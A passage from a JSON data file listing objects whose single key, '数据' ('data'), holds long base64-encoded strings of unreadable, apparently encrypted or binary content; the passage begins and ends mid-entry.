        "数据": "UsksqliMyRwdK2S16/KpdSLSY4GJTr2KU+/H6OJpdNQHyPlXG3Gy+HQ68FefRojgl+LPHrkgDSSqjSBaL7n3lIWO4LQGgb0/LrL3itkFf0p1N2CL5A4hGAvgcU0oS4M54dHMxEo8QP7xn6wGhkx0qUGpzWBiUrGUSLLSEG6Kd+gS4xywCrKUmNJhhSo+YODm5opcAMdFcUcMHOBri1/M31zMADVkoI4j/CkT9F1T6b5AxrvKqj01GUBymWtMBtPYlMYYoEaZlvwEjGZm/RRslS6MmZQ1uVM77WjA/m/dSJQnn1n3PKL0GFiH502oBYzT/SzAvpd9wODCqiHfNTX0MPY3kzJM+RwR3n/GMNr1zRkweHD+wvVVIJGgRauHFivI6EE84gS82kJereoDzzjAN4Fd0InT+ZbsESIrg0SKL/siqS9yNF3byHUZMHGhMeZDjTw1kc+MabPax4/AElke+1xDduiB8p2PxpJA9woTLT6rDpnEGn9E72Q/Yg6uoowfH8UlKs4Tz7EPieVTW73qZxrU2uNgGPUwOy1t2jtACgH6FoaimdVNp8eOKRYYuc/mJGr+Ou33dENem7ONWlU2cPUR3DF7T4pA0FQpoIueknNqaDU="
    },
    {
        "数据": "BG0hxVJwIHQSsOsWZ3DG9yTSRrrZg+hK5R/dcoCGrPucW9JqewV0ir95g4OBv45lEJRO02zwzI+ghLj9alKRShTIrTutkc4C+k9vu2Elf3s9UBR0izKz8+O8SMpT5sgnLMbtK/gtsPLM5N1ZIwILJ91wYZoGeqS9bn70tNJrl54wRsr11iN/1owFI9DflH25XKgkuRO+fpcLByGKkNV+llbNT1DaDb1dnm3IdxgMAffFer1CheVTXX9ZPcxCnUMnQpyI+o0hHs4a9rtSZUS9hUptPENiCVyBqoKutYEi5B6ejTdDwXFBdDKq/giiq5oJmUlIzL9g+u5JKhBoHHVSajEAfz32ubs4aP7UTVFVcy7pBi9NU9t6zBDchPjDBStfSWn2bThkeuPKuRJv/gEhgufca/JhMVoUe70vD0f668222xwAp9tl+GABH/MuVhS2DU+3KO74+lVsCHWwFRgoonSvOMgNgIm22dSd7gBpve1PKsC1FpD5QY126CfkCmwIj/rJTef3qlpa/o6PhwScr/Gq+aItxpVxa2QGDFkC7+h4TWJlbbLFeUAmbUdzU7FwvhWLLagT1id+A+mYrC6NNWnTm83Gcw=="
    },
    {
        "数据": "ulM5C6oesDSaiRJMMOiM+m75jrGToSG2KlqlgcdsactPWuKEhm3mVpUapGi1jmuc2JAT5pCX+ukGDwHVICWjYy7dI/Zr0gdWN8etAyM3cXY75XseGQ3KupwLvgn4f6DIuszDHxf4MHNvnpZtlo54O9PEu2Td+O+7Mv63OmfaN/EmmJcmRukA1J3l76A84vOto4IF6Jxwq4OPwWKYvAxremSrxIU/O+fGTccN2Zv7NtJF+LrjiPuk7d4sSWWk35aZbe6ljnYP7OKPe3IgaOyBTkGi46NrRNfT9q9cFgmddJs7y9SsZ8F1NIOVrga2UdO4wgVJ94qxdTOUKsBxKMGKTKNVttK7ac2dEkJvQqRBXdu5h5RThFCTeadLsufz6FtvzJ2NiavcQr7XrcXPvYGqn7qXcc7/IYXbsHccf0WioHd9OJSJIl8W3B7lyCRZkxGQWrxBYGfT10F69hrEcrQJsm/HB7yF/Kpkr0ngbPavn4JCsy9APpEubpWxAlLOCunk9IQApSrOlPM/B64jJOhDf4LWrbhzlMFZrn0+VZTjJKuStBaQnGUAolRJvUFWjb8pSN/fUyIQE9jQdEDkIxUcg+4UeU99ejxs"
    },
    {
        "数据": "NxvfMqPyhDTxJ3nl4KSrQ4+lMoLz8oP8BsyNa/ipCy4v4RlPVk8wPm5V+RGrDdvpO4LfSp3I4psPWYIMRkoPmWo0VJ3YCinb8lInkDZ+qU/T//34n/9WI8KnBuAmWUJZHLjy8iOmM5pC1w1d725X7mBozoHpAnk4v0IZ9WnHqmSx2PreQ8dkifX/9WJd6SfdPUc8f10Cp/H2co+laOSSSySoOIffAfBk6Io7P1NsJpECNeRiH5voC93RV6hpROudwz1UPCkc58S1Tg1TMiAieXwnnaFSFbeHvK5WwC6beQCakAdRDwp+uDkCDUP2fMWz8GC9M01+KPoaTrWauel0bdU/AIGOvy6McRg4943ozG2yIXIcr5H8ALG0XZC7TFIHTvv7Qm45WGEKoqVFZbZBGWiBHrzcPeDDDpfPyR/TE6z04UzbHNEIMCZ9A4kXtnWxZK2d6JZIvszdvxiU8OuCx4WHr+ncSxXcOIRf/zP0ye6nlQSEynyA+Cfr4fJf9oTSe/KGJZASfhpuMgGlWoKL+j7dlC74yvwI1s6J1yPQ5oNADGzhSdN8v2SHJK+TfzGQKAm7DFhaWr3oYHFXpx5SUik+G+zRRhpI"
    },
    {
        "数据": "yqbxyKUH4VxYEngW0gZ0UQWw4rEQZw1SB/YaTSfkGvuYnXyNIsPoUBmEez1AMMXyjoVXcaiE2eBbi7XF4Y4WI2HGTdc+JfPPsekM6Eo/GPiFS3zp2wLGr0euQH579DLkUm3yFcACHf4Rhogk4g5CPSMdNOoRynIIjxt2Ht9TfnQudb/enNuJq8ble7KMW2HZG+LVLnxKFVMTmCY5snfVcwiBRPXYrzumquX0j9NtnUfjU8QvPdurYt2ZZNn05kIjt1ZCUokm0ZxaKwffd16dSUWORSW5/UxKbi/xXVMOVMu8hnKhZiT1fZ4PkgKnYK48mgH9jiF2r27EfbxPwswJtYvrUny/+Kg+RmzVHiRAQZh8yelMqTJv3/BRVv9vzBnbBC4mbcC70B59LsjruU6UtahjRjXvjYUMzGHouQ0M7nO3NApkuS2qdJD36NWDm6YkjB9Bt9YUcwL/iV9Voy/E00FGNrf6IlrWZAR0KmYXHnlcAVSaRGe4if5dOtSJBgnC9fOH0SfgJMUslKUQHT2QDg2kqoStvqCVYNo1ojjZgBa6QqdG35SQtrAu8vpaLSsT45JSkG/XdH9t/a9wNPGHsHwYwTiIVZC+Zw=="
    },
    {
        "数据": "Kp7B5bw0FtP20aeGWel8bRIxnBImoZvwGtiLAQ4lxzGI0SAPE7h7Rf02dUoedDqGaHwOraeL6ZtbB2riBniBbH9oqS9wwAGimcziUfDWJ/E6fVy7DcCZuHmwa9VsXSDtiVg8HiQmBxS4cC0JnEk6bShZipvizeOjL2nGYCwsv3OQv1ttRqO6UkR8oWvi+92jpaJBYouwmJtsSXi5+TyjAxaFqWAze28EhC+O9jf2Rck1pH+/SQeoViay86DP4FntTcsf2pgkJRWDLNeX5ftQgiGmjHJg4IbP1FLbaUn/iTG4ZYlFth53N3TC38WnYBo2dDd2OybZOXcG67YdHWv/cvR2/Bnq/9FDQ6W0otq5Oq2HUw9YyzMMdEk0yYozs4Nhqssx6Cru/WXam8gm87x4LqUxNqY+2mvgzrKeThOxeE1fE3oVrBrCoTghun1zByg9n8s4eM7B5cuw5CawOto/ZT0o/axFEotbThdxctxy5gr8ntvZOdlu4OLumKR0xvzekzhd6dkUCnw06w9C4aW7iyR+kAnyWRu4iAZfrcaE4erPeBeNzMIj0avTJ30VXUmh76K6+kdn0tflLocRkP36UXJ/2tmLYsB6KPSXZA5FJ0Dw"
    },
    {
        "数据": "WAo/Coli0oXBkz8JZk+ameCx0amOOLgk+onMQWIT3q9lCaoYKQs7Fu2zt84/nw7sMsL1O0B2uSwEYRacpYaCF2/+DuWg/Jwnxcju/JMQ/UcdJWKHU06uovKAB8UaJe8EmZi4OoV2AJnQpGINXeZqT9eDovQ5aHs/o3n0G+K6nKd2BvhcPD9W/AyEQZg1oi268MqRGrHJbXQPGrHfZHimvWXtJ2hEXSmgPoG11wIuj6lFLuXyY3XyYMWAdslPZEmTs80GB7noI41FItsFCw1f/rZVJoO6bQKcE1mcP1lCL8YLybXkH+6MKKk2W3hwWj0PVtpv23EGUudkv7sfuydGsqZiRsjDQFPoZrgSB0ESKA0RFo9oJtvoRQJxBJ8yKl18Q0rURkHhUrRuxUPNQGmPE6G1n80wJx0TIK7QbUu5AlsvA04kc4C5Ib4yQ/4pKGLK7ytmGMpNOp+IRdV5ZQvWxfsbZJE5K3SwmlQyfPo8mvfgvpCLLMHZ0Bsg/Fh+7JFzffui/eNUqLsvnqXTXtjlJl2rEUh1d2gGwkiu8Cj4VVdIdEiiW7WLWjVmOH8tHONyJcJHrgA8F0d0hH6qEAl568CB+eLOXNhxLQTkjtsn9zmSolJAdrXY"
    },
    {
        "数据": "7bumxs/LVevnUqAC5gkNeUNymbqrkZ1CBMPqP4JYfEMRiJtqBX3S7OA5isvf38IFGor+LwG3EoBPp1E2W8bEJM50DatPuThp1IQZ8iPOP1ZU3LGfPmjrAMAAznXGZmtkNIgy+lenyb9wyv+L9bYYCI9vURWQt0Y/WjkYJ8C/ux4dRPo93fKHLddeHL5Vl4WAon8AG7npLlE8a6b1hb9i1FpQ+7+8cJlDH2aOIzGeF37QAl8Ji5uN3VmneWsUpf7sFEiCAO7bsEWbXumeeINAHuDrkFTSVxmYNSE54omnMVpOVZJYGRZ/QmpiQukUvYWRES40d9SA108sRbDbdVyr/n+Qlp2lUH83GKrq5djbRDs8va5IoFi3Vjjpue/vdf+k6aNkO9SxNIIzbK0dv/iPVGmZuvS53atC2Ssg+D/oQsjApfrsQoDUYsF0VS87rWO2VsKPGEZbjEGRsTrrHNL2HFKHsOb4KafRx09gUgG1lxxDHBm3dtk6uh5XZLjCOX0Nhf+2e8ZVRnkq2Ya+iDBEk5jgunm88BXg8OBOnyfapo2EvW6llFGQSl7VNora2YwOERrC5n2qtLUPV3RE8C0J2TZggioV06qD2UsnAElbCm8W+uUEPNqJcqvnXryZYA=="
    },
    {
        "数据": "ZxjNfo4OyV92dHdpdKYRCJTwnC23TKfnWGcKUz0ToFs+HzbPohNxmqSjHF6/ceL9qvgYGIj0uZI4szL0a3HII0ZaZ1HPj3ZH/zFizlyfo2C+qOPvjOv92ON7vBKaWKUa+JuSz/TF3RnZwLsFiwlSyM8Z5Mer6HnzkR9HJrOKmhPDSo2LQc7oLrDmaSz6VlgIexaaS+6pXzcfU5IZfwDmvcgu9ukPoSVvxBYii0LMkfjPMmyyChU3e6FnYQvNUi3ewUX+kLgmG+Q3h/ctnSpsX+dpdfHvqdT66ePfXkjfzlipApNNBe6KZMuEURivPfDejLTr4mivMNttmexSLAi6kBKy/5Dl9FMLqRDDh24ktci6B5P0nzXgKI17ZOGADYC2eXXILB6Dcq3LzwE9paETy1PKVeSHp5l0hdfP+LoEBlGnjwTkzBMi8U1u/tyRQksGN8ZLSIraSsqg3iRo8EB5kkwrmRSnbZf9ERd/amAsjE4c6AQafKYBPUOvILKHxHO2In4DpD5XS4SIzRa36tsjCLOulAxzIb0vu9/vCcOthPkb7VUZliVHDNC4GzfnTssz+clhXlFroDVtztuMTgt+Dy7gJ9stlryVH5+KEJXsDuEW"
    },
    {
        "数据": "i3Qo2I9izTBcS29Tuqzw95lApqrhl8CDsB6jgcLRECgL/ksgL4BQaZmGAiF+ufadDVfvx8+RUxakBIOulAAad2OwZ3wU+0bsXu2ESs+YPQyWMQcWDHgTTks/8hLs35z0EDKYhcjkKCUySsj5mziwaaA00gkKO50JaK61u30YBSgD5yq9ACjijDYTQSYpTqgpyPOxiwSwwUVaTLDTBgR9tuPHhKTr/ZwMzA9eUbDLAdahsyujJqfiYHu1NWgy4+soAniaSb9RX6yYn9v+b2gD2LU1Zztp0QymmUgzGqG44lf7aM/11fsDaXg4FWWri+cLxcB0yDSFmT0ohJ+h0BuZ+Kq8DOFtuT1YTmeLOwxia1tXCR4SUOUis5h4Lb2ihKvNtV2gS4adnROTRzGdFsgaaVNhZ8rvSXP13ElN5TUAJ/LASpDdDDrSA9yeWQbHTGYTeZ0EioMuqZQqwVR3KVNMXWHZVfk6sLxVhx7y1yykq1V3im+rcdoOwHLeRClMHHHFbFSCKHJ5j+PA1kiHwNpF/H+Og/vswd5m+No9PmP1Muo9M4mDzhbsD4aYi8TVbWCPEwPHGBkyO6I7TQeEHMfQ0Ozv1hw="
    },
    {
        "数据": "N2SyIcTz7ymudEwwSd0lXx7hphmsIAV8PR9C0YEJ2MfH0bNPCltuYNeO7P6zYsTVFaYTD1QJXHXbqYdpXlwN0Rk2TTxs+NpkSBWousxDzcDiHgikdQkXcFSILEaO4oRRzgsBi14mBFyso2H1LUgtUIy4/VgiBV12KO8KgnA/nrfV9L8HQiKP+RA8HqSnm1NirdUSH2dUZ0jHzLZ1bockdh1o9lY/0GayCZatDRFuKdRUEPkvILqTZc7vUwXISOeuOcRe8UHfVIZY6r+3zn0SWotAeXsxu7elsXnlTQv7S8o+2pnlWNyCu1lYg8p5Tin0aBhiWILw4BkA4IIPMWYxKosXTt2Dx4u3zwT+TY1EPT3/NWUGzMbP6Qv3W5JzHfkyeJESVzwXsweZfZzGxX1RFt5rEQB8Jfxw/ALcRCO+fJ38jaRz7+iT6d2iyiuDJeHOLZRCDthO78Lc7Vt1ZdBKYB4zRIneQOTyCN8ftdJO8TJQJcno96cSyPEQx3aonG6XaiGBR13qdfVZMj1ewBaK+t1pbhK9zyAY5yRYOOYrHUrV2Ws3uFOkQGU9sPLxFtgTXnX2zLvptvf1yI/aWmhlCPeV7Z5mIGO0anEbNBCKzIJIowRRDo0vBIloY3I0h7typw=="
    },
    {
        "数据": "eaeVSmTDyLWKEn2BX9Vga6xw0aIazuaZV2soss4k3ukJH/9zD0d08KryQ/o7+5q52cY3tbzFv1GkaGryBDp20GTjwo7myaT4bglY11xZjTwNFCDMIx3r7TDDYNIvppRyzNp/YhYF+e9mTf5J1uXzCUb2TwZkvJw58MqkDXKsVYXaNpJXvA/DChW3a2fcZ/jzCBDSg9jUROrIiNUKRTBY+VJaqrM683QTmAssav+GIDVMYhiZF9cE9PKoY2hRQGR25YH0JJVQFo6xNgqMDR33CQbrpRQbYg4S9PHq2ltKEk/4QOcE+MpTXUWJhuFkPmmhj/SRwC7XXRzYs+tpgqr8NmssPir9a+oHyPRS9aMmCeMLdDnQJrbJiONw2ja+F+RCEhk37XR0HJxJcZKdDn2tbkwh0d1yQ4DpvPCmTd3fj+ZAndP1GqnOLf96jNaER3laraERxot2iDkSNLuwrDcRT2F2TuLzos6PhGkIbzVx+eoL12ra3TdjlE3yFJiuR3bktqQCPcNN1EYsN7NpMW3XCvwr53JhTDloUkPLmF1cOus0alkpXENu2FB3RTpKuS502cHUDAKI19PQ4HPdBG1Tlz0wuq5FPj3/e5D8JnDNHD22hIqABRI="
    },
    {
        "数据": "0R004XFX9r3UCKT0VocwnC1CmFfzD0JKc4V0adrL6Qkazly8EnF7224D+1y7SdyYAGkTNe3O33ipHXw44JV80uJvqZ7KA8/A1X6Ai4lpPPs5KaYIPIjJNvs1GBNECTLqvKJ8pzOP0Fv2geXjZPmMb0HK2jFiK/Z6+4Koli1cPpK3qybmFeVrk+cUqDk+t8vwdVdFLO0XigVhP6KofCfane6pHMZgDKerXtRJDGAuVd2FC4cqcp6qcwQNX4bEKcz92kHHhSj8wm+7tYp8SPz/O2Gj0l5D4kqF1x1j8159ZYETrnqw4CWTLB+CgM3E57BwAw1CtA0ssoX3f3VbzKZRwrddGfqkboXQzDMWn/UQKiTDIsPQ9mS0K0xjsNwy6JgutPe+YC3IvL2WoOXWUK65WXEpvY2w8fIluLJqXsTtjRcgZJnYt5eiJsk/Eh/m4LmM6vxHkyq0eROE/aQ7QCpYwpdsNg+HcrZVuDEs7JOEGtHOzucn3KrGKzax2FppdrAljRDEnIE6F32Db2OQ1R7ru43xzVUC/XaTXjq0gNfRsxfT346pwVGpdUmBkUWxN7VH8tJFEdg9Dw98F3F/UQVltA5+f0Ce1li1jWpUzx4vqUFkf8I="
    },
    {
        "数据": "6p8zE7KwIOJRk6IpjlEYWJYJq6KSBI2w/grScEeiD/VYWXPzbWmT6QeaM7ur1K0iOcWaGc7EaFqEQafAG6NzOFhcY9gY5ibzQbQR2DElQ73abJG+IVVzJje9gpYQkOPmMjvg2KGZv1d2WppU3Wi0uyDFNvtTxpczMqn3JHg+s5HZADPLb5Xu+gUXM3Zp219yE566N+enxKAthNgG8bpIvlBN5gDANI3MIgVTN9Sg+8fsLav6bcomsYYgqkcrq0PnalWfqnaPAkC0r/tlACRPy6XQ5Wa9JN5tTwD+tbwIpFZVZbLhim6gcvQT0H0oYzgjJaPhZB6Uxr/RwgxZ0QhwfntY9faN+z/+HOrvSiEFHC4f5FKsFUXt9TrNaKblnRrGicqLK/rtjEPxaHr+d24rZ1NP9qCooHDiJlNoMVR355O4wr0mZiJWm/L46xb140hcUj7xGe7ALmnHxUB0V2FWjfL+tgMEMDWoJJMYi3pR9+Z4bOze1o+vabpib9wOSn2JmIMMbgO27nqQRjIN1CD1yDDCrEGE12+BZuLutlMAGxuNplM8eHjZYTXwxzU3RJdohuxw8gq3h5Twh8n/b2sY54xAZ0BM0g=="
    },
    {
        "数据": "X25MsrHtjbsfcy2SJuFiWCbay45yONipiBN/6HswY2zo0bZ+bk+Pr8J1M/Kx+ryCVw3zQpBdD2zg9k/PrzAJvBjEMzdtvCiza/2NBiBgq8S+z9qxbJ+ZL2NTJmXkS4urdZzjqm7N9LagqjZvqEODBW3x+hw+orL7wwbsE3/zAbuN4EzrZsJqYL21kCqrtKS7NlO/Hk8N2BjrZenpQzhqVQLCAEQ3NpgD/tgUucvWqAotFb2AoVM9Fe32YmMG1eUM37RxMKS3k+r/7F0hcs0WtHkKroI9Ecyy6ANlHhW+CwnI4NNzAgLpQaiKVEcZo28uOzJ3ckJBqSrFSrXEC7xS2DpAqtMJdVwozKsmqJpNRjDvchLNSjDvtdyc/FN8DKrstT9sGjHnGXy60riZb02/39QJJYg7KtAEJXBZBSQkMNsJIcUrxAE6LQQdulspvvyt2OnAmMOPCVPtEFw1ddcpf639hVGWlXmQ0r2Tc5wBghNmeVo4g/ei6YOcEO9+ixTMd7EmZIPdDUDyvJNkNPiJrQ6+9ddDPz2A1hZmP5oNkwv7FnvlQLsN1+A2O/RLehtURYTllHj/Tl9FDB/oydLcvdM1dKyK8LnSlowBQH012cyqi7nwowtNFFYRURYygPV9BHd3"
    },
    {
        "数据": "OtVZA10kOFhVTm1xJ8gqpv/ZDF8eFr10Tvsw39xQGdYU/IjSbOjTl7YU4d+rYgtgMoqUaqqiA3dTTHtT2D1ukeqvhLUou8gqV0Xh5jecCO7L98stkbNO7+KY+s+PPsNxWbC+l6wRNZ/Jq2AlKNBWRY8BWvB/GYh46uOQpF6PjVS2tlDKZgC/MGvhJwonQ0cqetMYfoPU7Zsac4oqDdqWNAfDoHaqfZGRS4MkGL9wEpvq5DAN4v9GhB/XdfuAquxcp2sAsVgYXfMSqQmOv/e+WZksaiVOYPkbsrLf6eCd+PY5eEZnkJtfLKrvW8FEpacHzxv1I6PEPEOrmrWKdXyGdc6iccJljlynWoThxXa0ncATJVQqnp5R8n4jUOhRd912qj+rXwDpU6uNTi5MXApjDMINpSEVanjMErywCGDhOt9+6Hqq+gbRLg7NjmbYJAE0pWG9pHQl1tvdcXCR+XchIfE/PbsqI9HPGz/uHjEyF0NLAoST5S6JId6dgGJ4hgsbpHcw5Ymqgv5tDG6+niuvMkOYAQEXcGVU2RekHQerGWmef+Ryl33TirHMuROnWu8IBHO5clLwceKAcRe2gPolVfVy"
    },
    {
        "数据": "u177j7B+3yJ/HRvI9U//DP8sxtdek32wZ4eKoFhRtPsapq/gG6s6CY/+yMtP8JqQCf8TDNqAeKdbH9HeyKD4YRo39DyZz2poOpWUw39i8PQVCOiL/csk/RopqXYXbb+Tmn2M30UWb1FptHB1oK2CaOcWZkzLkLEzlH9huXfCqshjQmWhmlPnXdBzHb2DuS+Vp5x4uwdhNjMgY89jrfpHlwnLm2ctmA2yLKYhuOAQ26P5JQojlbVA8oj0+qw2vqVW632ZTooYliE83Cfr2ks8tX24Jyy/sSML6ey2EyxY1x0OhlRIWTF7T6GxJulan+QsROvBOBTSb8SfHrqsLpMVFfoXcHoNst4qFPTp188OAzKa5uO+Yrn1iQ3lQ3UXZiJnCpqXVdFJ4KHpeS7vg7DfTNcctGJqNETWE1TNF3lYh8KS19COd+vkDvmntadOgJcKeAzQAnsF/WHJBcukCXBJ0GF1ZIYD41ItIxMSQWoF5TsBa+u4uSdHzhbDK0H5J3xv+SyKeSJ765mkt0ZbNDBUao2TjKQ67FN7VKJXLPjVyr1YqVwwphbJU2hegyO3QMcjCtuzlIpmCnDkZgX7VRmXOLk0SdvXkpIWjgU="
    },
    {
        "数据": "P/nDvjuztLGqff8tDiC8k8p/Yi+ZU7hIahXrxiWBHb8DakIzUsMwtgwTMdqnMO/mZGjK4FEAahZUOHzXdKS3O6NYYHf2R20BSyTSaxBU3BCUoKZCZmJz3x3cvJatRqq186jt+7p1ZcsvkLyPe7fusKuuy0CRGwShIRaw4LkK70wW5rtZCf7owlfY/kE91/fHmKuldhehoo/rn1N87DUfuY80lcWwr+ICTjD/EAXEWmmR/owHeRblfwFV61Avv0A9giR4QjL05l1+eDZTZMy+lhtcZUNR4IYU+T/7/XyeG0HP9ox/ILzsxLN0VMKV0/vcICo9Lv3sIM3Wd9HGXmEbT2Kur/LZ8Yv5TFthRa64FRLmAd8VESnzxblz8lvMbeGlEkJ994KlEIDHPolucScn+nlXcq4GJDP31OMOjTO+sLu0+0jCUvsbUFIGRXE49aJA7D4zEko+N/fRrpgmmatOdm+IdakVVqgi17PKHfCvP6NJvhNv5tZV6S/XMSDvY2jOrvSLPiiOj3V5NV0cMAN2yl7PmjZGlf3mxy7LRc0uGrX1DR2l5+5UlHi32tZ33dddClY8diMPvPfQEzt2FmWSNI74zpiq7Lq/EA=="
    },
    {
        "数据": "n16lE8KPTBTB4dhw8DAwfd838FGcuL6/T2g1eWL3c0b/vLp4uUdOmNe9i+0g3333M+rmsocEiO1/va+DAVzig2t8NxBH08pLDp867xLNvZKxUtwSbvAF91Vru5ckLJfGY+3/I350qMNaqYEUkidMpk2iV1CBLfAUB1P+HazNwrg9ILKyV+bdQoJKeZKepGdYDqWWNhQc0by6FQQN38R4/8JaczXMQNkLCqDsRCLMs0oSOx6IindRu4gaVqC6TYfJEv7gDjX0stN5z1fLpyrB3KyJAH7Xxh5blE6cqXWEplUjECXbGlGGTdDDXgkWEbW4/M3zWkdQF76CLrcr00w2CdHJgmCsGQLwTba2Sg7Hx+3H7IZ5l0FuqperAi9m8pcSc/vDfFrmv4PXjLWyLQsZm2Cj4Ene/LtV/a1bX91JxJ8CFYaI02d8W+Gd6+E1dxXagrdQ91syQUVITEnrRFD46YnUQSwfTAmH2TeRkd4BERE57szDeQinrLPeLZeM2cCfdVlo+zWmTNf6hYo6YDolQGJ1/PUzYQosDiOZb9fEQM1kpCHtT5FjIix0bsjJ4bDjvtneZTl0cpw2bo21XpqFxZAu4/afwCJDrSw6pATW1bI="
    },
    {
        "数据": "XkdzRfKRQzb+cdBX5oZ0eBE+lWiQKWR5O5pEue00ca0ykz4V+F0Um6v4dUKMIaGCAFtN5sarPyYnn9Cmh2sCIKfosRha44dggxuVDrKOTMM+nyTNPHwHZPk94uoMmLUS6qKLhzDB+KjkY3Ve+Gm226xgmwnnhSyfNaLvd3vsVTrrEvTvc9gqL6ju9bkqlg4bUws0izB7LygAlCqW3VG4BhVfkmgz+U9Hk3jkZUZQGvLMIMuGeSMrxNtxCnKkNkni0Ip5Jg5mwByGRqriHpVsTTLhg1mzGOpLAeF4HuJIDl0+1H5XQ0sArNKnexbUlj8/VInJ0me+NgL4llxzv91WzLE30KziZ9fJCh2pl0bKQGyt5GopnzpHwo9rluoUuaGxpypnVoAwyDmNhNLCUqj4DWEbfSBjp/6U81kceObtOaiIuibS4828eCWGcmh/J+lVvjFMWcyxuGuwpa6bUWZMNvbpdJDgamBppitos1fA4yL7dJTfEzbkLAcaFJXEHzJD4wMACoRibHEhnAvXX9AUyOZ20hUoxgjzrokBx57+4W8n+cj8yKbHiURX85N25Rw2YhcpXCNyaGlyQRpuKFkdZxdJ9A/889NmnpvOdG0="
    },
    {
        "数据": "8eRqQ4bKaQq13LoIplYE8QZ+SfxXbkI9yHFJSCzh1VgybKhrjy73aAyw3QJXK5OCK4jVjTm/KYOSoaKfdgPx50stcm+14gthJ2MGU6MOfztkdUJucIlk2C9INQxEAISOJA2wLjNEwt16IGdu+CHIobDhuEY8WYbyeqjysQ64nqIKuX2s/H7mlJItz1Z3JdiyRZj1AmHf3GAtpyosu2m79DGktpaTf/CYQVeI+ZK2J+oqKfgfAT5riSQdXWzPfXSkEJd3Pxn6YSOO8ZU8vt5YXsSUCu+XWuAL5WQ2jALUHkAa1kpq1XMu4YRGDylmT1bGwzZSWZ8wBI1DgbH/6Va4yhPVFvyjrzHjDWbrelEJ0Pj1t9KOtF6pI8z+iI/JvXOTNUkMFliijRiVcATS5GWADxFwZ7D44D+VYVnIFj4c9XrAeE3Zkb7pNbRkVykeq/hdSy3Er5PUkmHs2vpTEwLvMTy4KEpfhdGAqvIflvDN8Ipvji9ZN1evVQ+uErcggq34s3cI5a/TqTfD53Ec6XPypG8N/ZGFEG0lBgQDI4z+Dkgcrr3CU1mDt8sTSNvzkeIP0DRVJETkbD4+P1jly51Ptmstj+AAi0sYhl4="
    },
    {
        "数据": "aVrx3CRwQwCE1oFwyMBloDIVBjMVsiNa+iROOZ/2N3V5pe+ZFqZGLWjcA47kmVKyCtrM6sh7l9ggiLlteEosInJTC5DWcCEp6zGz3ddWTF1LREgQlhoZhWzfgJRQ2vAs7owRoHqkAfxL5x4GrgnLV85uD8bcgLvwscJTd0Zn9Zdsa1R3TL02HCQDBWCwBeTpJS77wWe9Qu5CozG5dwbqatuMkKDA7SABHRbGuP/vdPsrAKsvsRfRdHpzaRRslmR3cY7ZCqXY0BDQou4ZPvh7i3VJCsQI/nAyvyqB10phKQfN+pn6/I8nZQZ/W7rse9pVilaeqCVhISY7SrEawX8iJIBtEeDl5OGIo82JklHEOkniRbu8xzNGjlM7uhx1M9/bBwa9B4TnQqzQuj2LPWg1OMwSZpU2RotaPcbCyK93qHsflxn+ngQAVSfq0b2pW6R04xgGqGjZ7iCK5P8UJe1PLWyvrBgSl8vROn6qKt6zV+l0tp+hilBE4qFLPlrT/92LDZaoOm19NSe7R4m+Q9+fMbabycFY8Wn0WOCN8e0NvFQj5RG6gHThqE/W7FdbWbC04iaJwTGAHGtiSUbyfs73QE3997EzdKNxtzwp"
    },
    {
        "数据": "Hung0gT7IIIoGWFpRw4VjqmhY0CQZkBrPoFSkktalzfOk94PkO4uV325s64mUZ0CZ3VvQBvklvfZHBO+0pEgBCAZZqWBntbH9wQbJDCJQhQxt7zTYcumDkApzsZuHcYVjhBzbhKX2p76fZE9ujrLmBIwRnIgWKhq8yA2WMPnD0ognDGMAQ0XQeCJDT1Crnw5HCMN8k3AQ3nkJ1FgtDIwj8Wq/+7JWMq4uQ3FXJHmixutRXEjcs6d7lSqBVuRABnqhlF+Vn3UtPR5I4rfEbzKWlOixQB7xkoA+XTJwcdGYm80Y4FIEhS9zXX8HdMzgwFjMY/fretm4l2JltrY/lAiEQoHuCzgZpvDL4ZkXMYS57+QK1NIsjQ0Sl6HChIIHP2zzMqCUuUZKdgJdx6+wIbp7ghgGlQPI4TZMcn58MRz8WXayhOtJoSGs6Mgdf+8J3vlNuaRhY+gdUUdSqR37a+W1CQ+W+4+CNBTOUol04TYNKSX+XRKjJdRiHf3//NYnnEqKnSTE2RL+sjS5GEaComAyP7+9pOWcqAkOqlaRl+haYcIzoOrjiupVtv6oKl80kvHsP+VGE36QakpA2nSSchUJj1bqYwLpRzNXqyZSpYqbV3pCKL2gFTO8IGoUocSSkoO"
    },
    {
        "数据": "43BlZSguTzPcm0C++8PsSRgc4jmutoRlljNhRbj6w5Lxhh+1KGGrpaBlXec/LbdBJX81BI5C+Zb5A17qCmVb3PgbsfqemFJpUepDd6hCOdrYW4ACEsxgSbmec24ccnU8l4Y8HpIwVj7St3qXI+1Z163M2+hlDPXy67q7EFJV6K4Z7AJLwVb8blYYDLfWqBWod9qe+TO1JvOwXtehIAG8pVVYVK6bP87qAyIPXLltX+8WvxLiMD9hNUO1Ts3/Oqqqtl1TKeUe/fE6r7kGL7Tn/fWD6iRBtjA66XEv4E2p8/fDsythI7vImO/wwdFd3MAIEGjyx2OW+S09pidPfckodzjCBpLBAv8Z8ItWwS2In6GfG8sN+KHsRWXnIOUhXXV5XKAf5yHA3H4KP7Jc6bpIIqa50k6Ltz5Tm7RSA8zOEcwfDPwxYzWmAwF/hMvMTpXqUXIxhHnawnCqTVpJveXyqxiGiUeY0DPGoKTdJDlIZpdXot93GRd6G8BTjZ7ucLxO4PqSOEMHsMiKP/LWfn9ZyKQmAHi+1UG05WsDyXWJm+q/oIsQi6FzMPeCKAAU2W2myYRF9t+sL8MC6W5fEl4iqQosVUH7kMWsKfz1s5WgOkZT3GvBUo8="
    },
    {
        "数据": "0wYkU8OT3KcWCZs++ldiDU3vYYIqMMnMWnaeWmU2tF5JEmR+vnPzPPATSz5gXTztOm9rQZ7FZUt5ju0et4nFDHBzvw3L6bNK8SVTfizSLWsVMxcCV6Ayh4iBTrPW1Bj3Oq4x9Zygsdkrp1Rgid65GIosUZbiP0vbqAEdGGzhf58Hsyb3JvkdWtb/OZHFZGE3z9VaKCo2SwhT8vb7XwpK/6upqoyEU/mBxlCcWa0bMTv+H/iOeY9RPltoiXLoxRqYWOC/iKvVOxecSLSLqZqqIm6kbZwtNsOrmwcnxfFU62yYbZZcbbKmDf8SSLQ9POmDOMcPgpVwAc1fSH5Fg/qmRbCFri1+EnX/W4eVMAxc41rMgFpl5D2DTjIoxpGnQNB1Y99P6roqAJCB4+xQlkae/l33wZa7JDmqRe7CFutRLQXJg5HXE1JrJY115REfP0MhKq7VtPTUfpvgukG7PdGN3sTtnlhckE0RXEkuxkDBKqvwioIJxU4Q++w7BbljQOCNKdCPeJjIRNETtF5tlCaIzszkgCjHn2JNDd